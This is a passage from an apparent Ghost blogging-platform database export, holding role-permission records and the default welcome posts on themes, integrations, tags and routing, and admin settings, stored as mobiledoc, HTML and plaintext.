5d2754b4992f0652efb50e49"},{"id":"5d2754b5992f0652efb50f3f","role_id":"5d2754b3992f0652efb50e24","permission_id":"5d2754b4992f0652efb50e4a"},{"id":"5d2754b5992f0652efb50f40","role_id":"5d2754b3992f0652efb50e24","permission_id":"5d2754b4992f0652efb50e4b"},{"id":"5d2754b5992f0652efb50f41","role_id":"5d2754b3992f0652efb50e24","permission_id":"5d2754b4992f0652efb50e4c"},{"id":"5d2754b5992f0652efb50f42","role_id":"5d2754b3992f0652efb50e24","permission_id":"5d2754b4992f0652efb50e4d"},{"id":"5d2754b5992f0652efb50f43","role_id":"5d2754b3992f0652efb50e24","permission_id":"5d2754b4992f0652efb50e51"},{"id":"5d2754b5992f0652efb50f44","role_id":"5d2754b3992f0652efb50e24","permission_id":"5d2754b4992f0652efb50e3c"}],"permissions_users":[],"posts":[{"id":"5d2754b4992f0652efb50e6e","uuid":"eee04d2d-5459-45bb-8e9a-40df063c7d1b","title":"Creating a custom theme","slug":"themes","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"https://static.ghost.org/v1.0.0/images/marketplace.jpg\",\"caption\":\"Anyone can write a completely custom Ghost theme with some solid knowledge of HTML and CSS\"}]],\"markups\":[[\"a\",[\"href\",\"https://ghost.org/marketplace/\"]],[\"code\"],[\"a\",[\"href\",\"https://github.com/TryGhost/Casper\"]],[\"a\",[\"href\",\"https://docs.ghost.org/api/handlebars-themes/\"]],[\"strong\"],[\"a\",[\"href\",\"https://forum.ghost.org/c/themes\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Ghost comes with a beautiful default theme called Casper, which is designed to be a clean, readable publication layout and can be adapted for most purposes. However, Ghost can also be completely themed to suit your needs. Rather than just giving you a few basic settings which act as a poor proxy for code, we just let you write code.\"]]],[1,\"p\",[[0,[],0,\"There are a huge range of both free and premium pre-built themes which you can get from the \"],[0,[0],1,\"Ghost Theme Marketplace\"],[0,[],0,\", or you can create your own from scratch.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Ghost themes are written with a templating language called handlebars, which has a set of dynamic helpers to insert your data into template files. For example: \"],[0,[1],1,\"{{author.name}}\"],[0,[],0,\" outputs the name of the current author.\"]]],[1,\"p\",[[0,[],0,\"The best way to learn how to write your own Ghost theme is to have a look at \"],[0,[2],1,\"the source code for Casper\"],[0,[],0,\", which is heavily commented and should give you a sense of how everything fits together.\"]]],[3,\"ul\",[[[0,[1],1,\"default.hbs\"],[0,[],0,\" is the main template file, all contexts will load inside this file unless specifically told to use a different template.\"]],[[0,[1],1,\"post.hbs\"],[0,[],0,\" is the file used in the context of viewing a post.\"]],[[0,[1],1,\"index.hbs\"],[0,[],0,\" is the file used in the context of viewing the home page.\"]],[[0,[],0,\"and so on\"]]]],[1,\"p\",[[0,[],0,\"We've got \"],[0,[3],1,\"full and extensive theme documentation\"],[0,[],0,\" which outlines every template file, context and helper that you can use.\"]]],[1,\"p\",[[0,[],0,\"If you want to chat with other people making Ghost themes to get any advice or help, there's also a \"],[0,[4],1,\"themes\"],[0,[],0,\" section on our \"],[0,[5],1,\"public Ghost forum\"],[0,[],0,\".\"]]]]}","html":"<p>Ghost comes with a beautiful default theme called Casper, which is designed to be a clean, readable publication layout and can be adapted for most purposes. However, Ghost can also be completely themed to suit your needs. Rather than just giving you a few basic settings which act as a poor proxy for code, we just let you write code.</p><p>There are a huge range of both free and premium pre-built themes which you can get from the <a href=\"https://ghost.org/marketplace/\">Ghost Theme Marketplace</a>, or you can create your own from scratch.</p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://static.ghost.org/v1.0.0/images/marketplace.jpg\" class=\"kg-image\"><figcaption>Anyone can write a completely custom Ghost theme with some solid knowledge of HTML and CSS</figcaption></figure><!--kg-card-end: image--><p>Ghost themes are written with a templating language called handlebars, which has a set of dynamic helpers to insert your data into template files. For example: <code>{{author.name}}</code> outputs the name of the current author.</p><p>The best way to learn how to write your own Ghost theme is to have a look at <a href=\"https://github.com/TryGhost/Casper\">the source code for Casper</a>, which is heavily commented and should give you a sense of how everything fits together.</p><ul><li><code>default.hbs</code> is the main template file, all contexts will load inside this file unless specifically told to use a different template.</li><li><code>post.hbs</code> is the file used in the context of viewing a post.</li><li><code>index.hbs</code> is the file used in the context of viewing the home page.</li><li>and so on</li></ul><p>We've got <a href=\"https://docs.ghost.org/api/handlebars-themes/\">full and extensive theme documentation</a> which outlines every template file, context and helper that you can use.</p><p>If you want to chat with other people making Ghost themes to get any advice or help, there's also a <strong>themes</strong> section on our <a href=\"https://forum.ghost.org/c/themes\">public Ghost forum</a>.</p>","comment_id":"5d2754b4992f0652efb50e6e","plaintext":"Ghost comes with a beautiful default theme called Casper, which is designed to\nbe a clean, readable publication layout and can be adapted for most purposes.\nHowever, Ghost can also be completely themed to suit your needs. Rather than\njust giving you a few basic settings which act as a poor proxy for code, we just\nlet you write code.\n\nThere are a huge range of both free and premium pre-built themes which you can\nget from the Ghost Theme Marketplace [https://ghost.org/marketplace/], or you\ncan create your own from scratch.\n\nAnyone can write a completely custom Ghost theme with some solid knowledge of\nHTML and CSSGhost themes are written with a templating language called\nhandlebars, which has a set of dynamic helpers to insert your data into template\nfiles. For example: {{author.name}} outputs the name of the current author.\n\nThe best way to learn how to write your own Ghost theme is to have a look at \nthe\nsource code for Casper [https://github.com/TryGhost/Casper], which is heavily\ncommented and should give you a sense of how everything fits together.\n\n * default.hbs is the main template file, all contexts will load inside this\n   file unless specifically told to use a different template.\n * post.hbs is the file used in the context of viewing a post.\n * index.hbs is the file used in the context of viewing the home page.\n * and so on\n\nWe've got full and extensive theme documentation\n[https://docs.ghost.org/api/handlebars-themes/] which outlines every template\nfile, context and helper that you can use.\n\nIf you want to chat with other people making Ghost themes to get any advice or\nhelp, there's also a themes section on our public Ghost forum\n[https://forum.ghost.org/c/themes].","feature_image":"https://static.ghost.org/v2.0.0/images/creating-a-custom-theme.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2019-07-11T15:24:36.000Z","updated_at":"2019-09-04T12:53:53.000Z","published_at":"2019-07-11T15:24:36.000Z","custom_excerpt":"Ghost comes with a beautiful default theme called Casper, which is designed to be a clean, readable publication layout and can be easily adapted for most purposes.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d2754b5992f0652efb50e70","uuid":"7cf5b207-e27a-4f31-8c3b-c3c3f6a7e679","title":"Apps & integrations","slug":"apps-integrations","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"<script src=\\\"https://zapier.com/apps/embed/widget.js?services=Ghost&container=true&limit=8\\\"></script>\\n\"}]],\"markups\":[[\"a\",[\"href\",\"https://zapier.com\"]],[\"strong\"],[\"a\",[\"href\",\"https://docs.ghost.org/api/handlebars-themes/\"]],[\"em\"],[\"a\",[\"href\",\"https://docs.ghost.org/integrations/disqus/\"]],[\"a\",[\"href\",\"https://docs.ghost.org/integrations/discourse/\"]],[\"a\",[\"href\",\"https://help.ghost.org/article/89-mathjax\"]],[\"a\",[\"href\",\"https://prismjs.com/\"]],[\"a\",[\"href\",\"https://www.google.com/forms/\"]],[\"a\",[\"href\",\"https://www.typeform.com/\"]],[\"a\",[\"href\",\"https://docs.ghost.org/api/\"]],[\"a\",[\"href\",\"/themes/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"There are three primary ways to work with third-party services in Ghost: using Zapier, editing your theme, or using the Ghost API.\"]]],[1,\"h1\",[[0,[],0,\"Zapier\"]]],[1,\"p\",[[0,[],0,\"You can connect your Ghost site to over 1,000 external services using the official integration with \"],[0,[0],1,\"Zapier\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Zapier sets up automations with Triggers and Actions, which allows you to create and customise a wide range of connected applications.\"]]],[1,\"blockquote\",[[0,[1],1,\"Example\"],[0,[],0,\": When someone new subscribes to a newsletter on a Ghost site (Trigger) then the contact information is automatically pushed into MailChimp (Action).\"]]],[1,\"p\",[[0,[1],1,\"Here are the most popular Ghost<>Zapier automation templates:\"],[0,[],0,\" \"]]],[10,0],[1,\"h1\",[[0,[],0,\"Editing your theme\"]]],[1,\"p\",[[0,[],0,\"One of the biggest advantages of using Ghost over centralised platforms is that you have total control over the front end of your site. Either customise your existing theme, or create a new theme from scratch with our \"],[0,[2],1,\"Theme SDK\"],[0,[],0,\". \"]]],[1,\"p\",[[0,[],0,\"You can integrate \"],[0,[3],1,\"any\"],[0,[],0,\" front end code into a Ghost theme without restriction, and it will work just fine. No restrictions!\"]]],[1,\"p\",[[0,[1],1,\"Here are some common examples\"],[0,[],0,\":\"]]],[3,\"ul\",[[[0,[],0,\"Include comments on a Ghost blog with \"],[0,[4],1,\"Disqus\"],[0,[],0,\" or \"],[0,[5],1,\"Discourse\"]],[[0,[],0,\"Implement \"],[0,[6],1,\"MathJAX\"],[0,[],0,\" with a little bit of JavaScript\"]],[[0,[],0,\"Add syntax highlighting to your code snippets using \"],[0,[7],1,\"Prism.js\"]],[[0,[],0,\"Integrate any dynamic forms from \"],[0,[8],1,\"Google\"],[0,[],0,\" or \"],[0,[9],1,\"Typeform\"],[0,[],0,\" to capture data\"]],[[0,[],0,\"Just about anything which uses JavaScript, APIs and Markup.\"]]]],[1,\"h1\",[[0,[],0,\"Using the Public API\"]]],[1,\"p\",[[0,[],0,\"Ghost itself is driven by a set of core APIs, and so you can access the Public Ghost JSON API from external webpages or applications in order to pull data and display it in other places.\"]]],[1,\"blockquote\",[[0,[],0,\"The Ghost API is \"],[0,[10],1,\"thoroughly documented\"],[0,[],0,\" and straightforward to work with for developers of almost any level. \"]]],[1,\"p\",[[0,[],0,\"Alright, the last post in our welcome-series! If you're curious about creating your own Ghost theme from scratch, here are \"],[0,[11],1,\"some more details\"],[0,[],0,\" on how that works.\"]]]]}","html":"<p>There are three primary ways to work with third-party services in Ghost: using Zapier, editing your theme, or using the Ghost API.</p><h1 id=\"zapier\">Zapier</h1><p>You can connect your Ghost site to over 1,000 external services using the official integration with <a href=\"https://zapier.com\">Zapier</a>.</p><p>Zapier sets up automations with Triggers and Actions, which allows you to create and customise a wide range of connected applications.</p><blockquote><strong>Example</strong>: When someone new subscribes to a newsletter on a Ghost site (Trigger) then the contact information is automatically pushed into MailChimp (Action).</blockquote><p><strong>Here are the most popular Ghost&lt;&gt;Zapier automation templates:</strong> </p><!--kg-card-begin: markdown--><script src=\"https://zapier.com/apps/embed/widget.js?services=Ghost&container=true&limit=8\"></script>\n<!--kg-card-end: markdown--><h1 id=\"editing-your-theme\">Editing your theme</h1><p>One of the biggest advantages of using Ghost over centralised platforms is that you have total control over the front end of your site. Either customise your existing theme, or create a new theme from scratch with our <a href=\"https://docs.ghost.org/api/handlebars-themes/\">Theme SDK</a>. </p><p>You can integrate <em>any</em> front end code into a Ghost theme without restriction, and it will work just fine. No restrictions!</p><p><strong>Here are some common examples</strong>:</p><ul><li>Include comments on a Ghost blog with <a href=\"https://docs.ghost.org/integrations/disqus/\">Disqus</a> or <a href=\"https://docs.ghost.org/integrations/discourse/\">Discourse</a></li><li>Implement <a href=\"https://help.ghost.org/article/89-mathjax\">MathJAX</a> with a little bit of JavaScript</li><li>Add syntax highlighting to your code snippets using <a href=\"https://prismjs.com/\">Prism.js</a></li><li>Integrate any dynamic forms from <a href=\"https://www.google.com/forms/\">Google</a> or <a href=\"https://www.typeform.com/\">Typeform</a> to capture data</li><li>Just about anything which uses JavaScript, APIs and Markup.</li></ul><h1 id=\"using-the-public-api\">Using the Public API</h1><p>Ghost itself is driven by a set of core APIs, and so you can access the Public Ghost JSON API from external webpages or applications in order to pull data and display it in other places.</p><blockquote>The Ghost API is <a href=\"https://docs.ghost.org/api/\">thoroughly documented</a> and straightforward to work with for developers of almost any level. </blockquote><p>Alright, the last post in our welcome-series! If you're curious about creating your own Ghost theme from scratch, here are <a href=\"/themes/\">some more details</a> on how that works.</p>","comment_id":"5d2754b5992f0652efb50e70","plaintext":"There are three primary ways to work with third-party services in Ghost: using\nZapier, editing your theme, or using the Ghost API.\n\nZapier\nYou can connect your Ghost site to over 1,000 external services using the\nofficial integration with Zapier [https://zapier.com].\n\nZapier sets up automations with Triggers and Actions, which allows you to create\nand customise a wide range of connected applications.\n\n> Example: When someone new subscribes to a newsletter on a Ghost site (Trigger)\nthen the contact information is automatically pushed into MailChimp (Action).\nHere are the most popular Ghost<>Zapier automation templates: \n\nEditing your theme\nOne of the biggest advantages of using Ghost over centralised platforms is that\nyou have total control over the front end of your site. Either customise your\nexisting theme, or create a new theme from scratch with our Theme SDK\n[https://docs.ghost.org/api/handlebars-themes/]. \n\nYou can integrate any front end code into a Ghost theme without restriction, and\nit will work just fine. No restrictions!\n\nHere are some common examples:\n\n * Include comments on a Ghost blog with Disqus\n   [https://docs.ghost.org/integrations/disqus/] or Discourse\n   [https://docs.ghost.org/integrations/discourse/]\n * Implement MathJAX [https://help.ghost.org/article/89-mathjax] with a little\n   bit of JavaScript\n * Add syntax highlighting to your code snippets using Prism.js\n   [https://prismjs.com/]\n * Integrate any dynamic forms from Google [https://www.google.com/forms/] or \n   Typeform [https://www.typeform.com/] to capture data\n * Just about anything which uses JavaScript, APIs and Markup.\n\nUsing the Public API\nGhost itself is driven by a set of core APIs, and so you can access the Public\nGhost JSON API from external webpages or applications in order to pull data and\ndisplay it in other places.\n\n> The Ghost API is thoroughly documented [https://docs.ghost.org/api/] and\nstraightforward to work with for developers of almost any level. \nAlright, the last post in our welcome-series! If you're curious about creating\nyour own Ghost theme from scratch, here are some more details [/themes/] on how\nthat works.","feature_image":"https://static.ghost.org/v2.0.0/images/app-integrations.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-09-04T12:54:41.000Z","published_at":"2019-07-11T15:24:37.000Z","custom_excerpt":"There are three primary ways to work with third-party services in Ghost: using Zapier, editing your theme, or using the Ghost API.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d2754b5992f0652efb50e72","uuid":"48bb29c9-7da2-4da9-ab4e-3c9ea651ca44","title":"Organising your content","slug":"organising-content","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}]],\"cards\":[],\"markups\":[[\"strong\"],[\"code\"],[\"em\"],[\"a\",[\"href\",\"https://docs.ghost.org/api/handlebars-themes/\"]],[\"a\",[\"href\",\"http://yaml.org/spec/1.2/spec.html\",\"rel\",\"noreferrer nofollow noopener\"]],[\"a\",[\"href\",\"https://docs.ghost.org/concepts/routing/\"]],[\"a\",[\"href\",\"/apps-integrations/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Ghost has a flexible organisational taxonomy called\"],[0,[0],1,\" tags\"],[0,[],0,\" which can be used to configure your site structure using \"],[0,[0],1,\"dynamic routing\"],[0,[],0,\". \"]]],[1,\"h1\",[[0,[],0,\"Basic Tagging\"]]],[1,\"p\",[[0,[],0,\"You can think of tags like Gmail labels. By tagging posts with one or more keyword, you can organise articles into buckets of related content.\"]]],[1,\"p\",[[0,[],0,\"When you create content for your publication you can assign tags to help differentiate between categories of content. \"]]],[1,\"p\",[[0,[],0,\"For example you may tag some content with  News and other content with Podcast, which would create two distinct categories of content listed on \"],[0,[1],1,\"/tag/news/\"],[0,[],0,\" and \"],[0,[1],1,\"/tag/weather/\"],[0,[],0,\", respectively.\"]]],[1,\"p\",[[0,[],0,\"If you tag a post with both \"],[0,[1],1,\"News\"],[0,[],0,\" \"],[0,[2],1,\"and\"],[0,[],0,\" \"],[0,[1],1,\"Weather\"],[0,[],0,\" - then it appears in both sections. Tag archives are like dedicated home-pages for each category of content that you have. They have their own pages, their own RSS feeds, and can support their own cover images and meta data.\"]]],[1,\"h1\",[[0,[],0,\"The primary tag\"]]],[1,\"p\",[[0,[],0,\"Inside the Ghost editor, you can drag and drop tags into a specific order. The first tag in the list is always given the most importance, and some themes will only display the primary tag (the first tag in the list) by default. \"]]],[1,\"blockquote\",[[0,[2,0],1,\"News\"],[0,[],1,\", Technology, Startup\"]]],[1,\"p\",[[0,[],0,\"So you can add the most important tag which you want to show up in your theme, but also add related tags which are less important.\"]]],[1,\"h1\",[[0,[],0,\"Private tags\"]]],[1,\"p\",[[0,[],0,\"Sometimes you may want to assign a post a specific tag, but you don't necessarily want that tag appearing in the theme or creating an archive page. In Ghost, hashtags are private and can be used for special styling.\"]]],[1,\"p\",[[0,[],0,\"For example, if you sometimes publish posts with video content - you might want your theme to adapt and get rid of the sidebar for these posts, to give more space for an embedded video to fill the screen. In this case, you could use private tags to tell your theme what to do.\"]]],[1,\"blockquote\",[[0,[2,0],1,\"News\"],[0,[],1,\", #video\"]]],[1,\"p\",[[0,[],0,\"Here, the theme would assign the post publicly displayed tags of News - but it would also keep a private record of the post being tagged with #video. In your theme, you could then look for private tags conditionally and give them special formatting. \"]]],[1,\"blockquote\",[[0,[2],0,\"You can find documentation for theme development techniques like this and many more over on Ghost's extensive \"],[0,[3],1,\"theme documentation\"],[0,[],1,\".\"]]],[1,\"h1\",[[0,[],0,\"Dynamic Routing\"]]],[1,\"p\",[[0,[],0,\"Dynamic routing gives you the ultimate freedom to build a custom publication to suit your needs. Routes are rules that map URL patterns to your content and templates. \"]]],[1,\"p\",[[0,[],0,\"For example, you may not want content tagged with \"],[0,[1],1,\"News\"],[0,[],0,\" to exist on: \"],[0,[1],1,\"example.com/tag/news\"],[0,[],0,\". Instead, you want it to exist on \"],[0,[1],1,\"example.com/news\"],[0,[],0,\" . \"]]],[1,\"p\",[[0,[],0,\"In this case you can use dynamic routes to create customised collections of content on your site. It's also possible to use multiple templates in your theme to render each content type differently.\"]]],[1,\"p\",[[0,[],0,\"There are lots of use cases for dynamic routing with Ghost, here are a few common examples: \"]]],[3,\"ul\",[[[0,[],0,\"Setting a custom home page with its own template\"]],[[0,[],0,\"Having separate content hubs for blog and podcast, that render differently, and have custom RSS feeds to support two types of content\"]],[[0,[],0,\"Creating a founders column as a unique view, by filtering content created by specific authors\"]],[[0,[],0,\"Including dates in permalinks for your posts\"]],[[0,[],0,\"Setting posts to have a URL relative to their primary tag like \"],[0,[1],1,\"example.com/europe/story-title/\"],[1,[],0,0]]]],[1,\"blockquote\",[[0,[2],0,\"Dynamic routing can be configured in Ghost using \"],[0,[4],1,\"YAML\"],[0,[],0,\" files. Read our dynamic routing \"],[0,[5],1,\"documentation\"],[0,[],1,\" for further details.\"]]],[1,\"p\",[[0,[],0,\"You can further customise your site using \"],[0,[6],1,\"Apps & Integrations\"],[0,[],0,\".\"]]]]}","html":"<p>Ghost has a flexible organisational taxonomy called<strong> tags</strong> which can be used to configure your site structure using <strong>dynamic routing</strong>. </p><h1 id=\"basic-tagging\">Basic Tagging</h1><p>You can think of tags like Gmail labels. By tagging posts with one or more keyword, you can organise articles into buckets of related content.</p><p>When you create content for your publication you can assign tags to help differentiate between categories of content. </p><p>For example you may tag some content with  News and other content with Podcast, which would create two distinct categories of content listed on <code>/tag/news/</code> and <code>/tag/weather/</code>, respectively.</p><p>If you tag a post with both <code>News</code> <em>and</em> <code>Weather</code> - then it appears in both sections. Tag archives are like dedicated home-pages for each category of content that you have. They have their own pages, their own RSS feeds, and can support their own cover images and meta data.</p><h1 id=\"the-primary-tag\">The primary tag</h1><p>Inside the Ghost editor, you can drag and drop tags into a specific order. The first tag in the list is always given the most importance, and some themes will only display the primary tag (the first tag in the list) by default. </p><blockquote><em><strong>News</strong>, Technology, Startup</em></blockquote><p>So you can add the most important tag which you want to show up in your theme, but also add related tags which are less important.</p><h1 id=\"private-tags\">Private tags</h1><p>Sometimes you may want to assign a post a specific tag, but you don't necessarily want that tag appearing in the theme or creating an archive page. In Ghost, hashtags are private and can be used for special styling.</p><p>For example, if you sometimes publish posts with video content - you might want your theme to adapt and get rid of the sidebar for these posts, to give more space for an embedded video to fill the screen. In this case, you could use private tags to tell your theme what to do.</p><blockquote><em><strong>News</strong>, #video</em></blockquote><p>Here, the theme would assign the post publicly displayed tags of News - but it would also keep a private record of the post being tagged with #video. In your theme, you could then look for private tags conditionally and give them special formatting. </p><blockquote><em>You can find documentation for theme development techniques like this and many more over on Ghost's extensive <a href=\"https://docs.ghost.org/api/handlebars-themes/\">theme documentation</a>.</em></blockquote><h1 id=\"dynamic-routing\">Dynamic Routing</h1><p>Dynamic routing gives you the ultimate freedom to build a custom publication to suit your needs. Routes are rules that map URL patterns to your content and templates. </p><p>For example, you may not want content tagged with <code>News</code> to exist on: <code>example.com/tag/news</code>. Instead, you want it to exist on <code>example.com/news</code> . </p><p>In this case you can use dynamic routes to create customised collections of content on your site. It's also possible to use multiple templates in your theme to render each content type differently.</p><p>There are lots of use cases for dynamic routing with Ghost, here are a few common examples: </p><ul><li>Setting a custom home page with its own template</li><li>Having separate content hubs for blog and podcast, that render differently, and have custom RSS feeds to support two types of content</li><li>Creating a founders column as a unique view, by filtering content created by specific authors</li><li>Including dates in permalinks for your posts</li><li>Setting posts to have a URL relative to their primary tag like <code>example.com/europe/story-title/</code><br></li></ul><blockquote><em>Dynamic routing can be configured in Ghost using <a href=\"http://yaml.org/spec/1.2/spec.html\" rel=\"noreferrer nofollow noopener\">YAML</a> files. Read our dynamic routing <a href=\"https://docs.ghost.org/concepts/routing/\">documentation</a> for further details.</em></blockquote><p>You can further customise your site using <a href=\"/apps-integrations/\">Apps &amp; Integrations</a>.</p>","comment_id":"5d2754b5992f0652efb50e72","plaintext":"Ghost has a flexible organisational taxonomy called tags which can be used to\nconfigure your site structure using dynamic routing. \n\nBasic Tagging\nYou can think of tags like Gmail labels. By tagging posts with one or more\nkeyword, you can organise articles into buckets of related content.\n\nWhen you create content for your publication you can assign tags to help\ndifferentiate between categories of content. \n\nFor example you may tag some content with  News and other content with Podcast,\nwhich would create two distinct categories of content listed on /tag/news/ and \n/tag/weather/, respectively.\n\nIf you tag a post with both News and Weather - then it appears in both sections.\nTag archives are like dedicated home-pages for each category of content that you\nhave. They have their own pages, their own RSS feeds, and can support their own\ncover images and meta data.\n\nThe primary tag\nInside the Ghost editor, you can drag and drop tags into a specific order. The\nfirst tag in the list is always given the most importance, and some themes will\nonly display the primary tag (the first tag in the list) by default. \n\n> News, Technology, Startup\nSo you can add the most important tag which you want to show up in your theme,\nbut also add related tags which are less important.\n\nPrivate tags\nSometimes you may want to assign a post a specific tag, but you don't\nnecessarily want that tag appearing in the theme or creating an archive page. In\nGhost, hashtags are private and can be used for special styling.\n\nFor example, if you sometimes publish posts with video content - you might want\nyour theme to adapt and get rid of the sidebar for these posts, to give more\nspace for an embedded video to fill the screen. In this case, you could use\nprivate tags to tell your theme what to do.\n\n> News, #video\nHere, the theme would assign the post publicly displayed tags of News - but it\nwould also keep a private record of the post being tagged with #video. In your\ntheme, you could then look for private tags conditionally and give them special\nformatting. \n\n> You can find documentation for theme development techniques like this and many\nmore over on Ghost's extensive theme documentation\n[https://docs.ghost.org/api/handlebars-themes/].\nDynamic Routing\nDynamic routing gives you the ultimate freedom to build a custom publication to\nsuit your needs. Routes are rules that map URL patterns to your content and\ntemplates. \n\nFor example, you may not want content tagged with News to exist on: \nexample.com/tag/news. Instead, you want it to exist on example.com/news . \n\nIn this case you can use dynamic routes to create customised collections of\ncontent on your site. It's also possible to use multiple templates in your theme\nto render each content type differently.\n\nThere are lots of use cases for dynamic routing with Ghost, here are a few\ncommon examples: \n\n * Setting a custom home page with its own template\n * Having separate content hubs for blog and podcast, that render differently,\n   and have custom RSS feeds to support two types of content\n * Creating a founders column as a unique view, by filtering content created by\n   specific authors\n * Including dates in permalinks for your posts\n * Setting posts to have a URL relative to their primary tag like \n   example.com/europe/story-title/\n   \n\n> Dynamic routing can be configured in Ghost using YAML\n[http://yaml.org/spec/1.2/spec.html] files. Read our dynamic routing \ndocumentation [https://docs.ghost.org/concepts/routing/] for further details.\nYou can further customise your site using Apps & Integrations\n[/apps-integrations/].","feature_image":"https://static.ghost.org/v2.0.0/images/organising-your-content.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-09-04T12:54:34.000Z","published_at":"2019-07-11T15:24:38.000Z","custom_excerpt":"Ghost has a flexible organisational taxonomy called tags which can be used to configure your site structure using dynamic routing.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d2754b5992f0652efb50e74","uuid":"f556a6d7-027f-4407-bc3b-900d61e71eb4","title":"Managing admin settings","slug":"admin-settings","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"image\",{\"src\":\"https://static.ghost.org/v1.0.0/images/private.png\"}],[\"hr\",{}]],\"markups\":[[\"a\",[\"href\",\"/ghost/settings/general/\"]],[\"em\"],[\"strong\"],[\"a\",[\"href\",\"https://ghost.org/pricing/\"]],[\"a\",[\"href\",\"/organising-content/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"There are a couple of things to do next while you're getting set up:\"]]],[1,\"h1\",[[0,[],0,\"Make your site private\"]]],[1,\"p\",[[0,[],0,\"If you've got a publication that you don't want the world to see yet because it's not ready to launch, you can hide your Ghost site behind a basic shared pass-phrase.\"]]],[1,\"p\",[[0,[],0,\"You can toggle this preference on at the bottom of Ghost's \"],[0,[0],1,\"General Settings\"],[0,[],0,\":\"]]],[10,0],[1,\"p\",[[0,[],0,\"Ghost will give you a short, randomly generated pass-phrase which you can share with anyone who needs access to the site while you're working on it. While this setting is enabled, all search engine optimisation features will be switched off to help keep your site under the radar.\"]]],[1,\"p\",[[0,[],0,\"Do remember though, this is \"],[0,[1],1,\"not\"],[0,[],0,\" secure authentication. You shouldn't rely on this feature for protecting important private data. It's just a simple, shared pass-phrase for some very basic privacy.\"]]],[10,1],[1,\"h1\",[[0,[],0,\"Invite your team \"]]],[1,\"p\",[[0,[],0,\"Ghost has a number of different user roles for your team:\"]]],[1,\"p\",[[0,[2],1,\"Contributors\"],[1,[],0,0],[0,[],0,\"This is the base user level in Ghost. Contributors can create and edit their own draft posts, but they are unable to edit drafts of others or publish posts. Contributors are \"],[0,[2],1,\"untrusted\"],[0,[],0,\" users with the most basic access to your publication.\"]]],[1,\"p\",[[0,[2],1,\"Authors\"],[1,[],0,1],[0,[],0,\"Authors are the 2nd user level in Ghost. Authors can write, edit  and publish their own posts. Authors are \"],[0,[2],1,\"trusted\"],[0,[],0,\" users. If you don't trust users to be allowed to publish their own posts, they should be set as Contributors.\"]]],[1,\"p\",[[0,[2],1,\"Editors\"],[1,[],0,2],[0,[],0,\"Editors are the 3rd user level in Ghost. Editors can do everything that an Author can do, but they can also edit and publish the posts of others - as well as their own. Editors can also invite new Contributors+Authors to the site.\"]]],[1,\"p\",[[0,[2],1,\"Administrators\"],[1,[],0,3],[0,[],0,\"The top user level in Ghost is Administrator. Again, administrators can do everything that Authors and Editors can do, but they can also edit all site settings and data, not just content. Additionally, administrators have full access to invite, manage or remove any other user of the site.\"],[1,[],0,4],[1,[],0,5],[0,[2],1,\"The Owner\"],[1,[],0,6],[0,[],0,\"There is only ever one owner of a Ghost site. The owner is a special user which has all the same permissions as an Administrator, but with two exceptions: The Owner can never be deleted. And in some circumstances the owner will have access to additional special settings if applicable. For example: billing details, if using \"],[0,[3,2],2,\"Ghost(Pro)\"],[0,[],0,\".\"]]],[1,\"blockquote\",[[0,[1],1,\"It's a good idea to ask all of your users to fill out their user profiles, including bio and social links. These will populate rich structured data for posts and generally create more opportunities for themes to fully populate their design.\"]]],[1,\"p\",[[0,[],0,\"Next up: \"],[0,[4],1,\"Organising your content\"],[0,[],0,\" \"]]]]}","html":"<p>There are a couple of things to do next while you're getting set up:</p><h1 id=\"make-your-site-private\">Make your site private</h1><p>If you've got a publication that you don't want the world to see yet because it's not ready to launch, you can hide your Ghost site behind a basic shared pass-phrase.</p><p>You can toggle this preference on at the bottom of Ghost's <a href=\"/ghost/settings/general/\">General Settings</a>:</p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"https://static.ghost.org/v1.0.0/images/private.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><p>Ghost will give you a short, randomly generated pass-phrase which you can share with anyone who needs access to the site while you're working on it. While this setting is enabled, all search engine optimisation features will be switched off to help keep your site under the radar.</p><p>Do remember though, this is <em>not</em> secure authentication. You shouldn't rely on this feature for protecting important private data. It's just a simple, shared pass-phrase for some very basic privacy.</p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><h1 id=\"invite-your-team\">Invite your team </h1><p>Ghost has a number of different user roles for your team:</p><p><strong>Contributors</strong><br>This is the base user level in Ghost. Contributors can create and edit their own draft posts, but they are unable to edit drafts of others or publish posts. Contributors are <strong>untrusted</strong> users with the most basic access to your publication.</p><p><strong>Authors</strong><br>Authors are the 2nd user level in Ghost. Authors can write, edit  and publish their own posts. Authors are <strong>trusted</strong> users. If you don't trust users 